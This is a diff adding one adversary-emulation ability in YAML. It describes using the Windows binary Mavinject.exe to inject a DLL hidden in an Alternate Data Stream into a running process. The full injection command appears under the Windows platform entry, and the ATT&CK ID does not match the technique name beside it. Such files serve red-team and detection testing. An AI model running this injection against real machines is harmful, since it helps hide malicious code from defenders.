@@ -1,0 +1,23 @@
+- id: ebf9d311-0d5b-2959-e3ba-bb526a23823d
+  name: Mavinject.exe - Inject file.dll stored as an Alternate Data Stream (ADS) into
+    a process with PID 4172
+  description: Inject file.dll stored as an Alternate Data Stream (ADS) into a process
+    with PID 4172
+  tactic: defense-evasion
+  technique:
+    attack_id: T1564.004
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'Mavinject.exe 4172 /INJECTRUNNING #{host.dir.temp}:file.dll'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2018-05-25'
+  modified: '2018-05-25'
+  operating_system: Windows All Versions
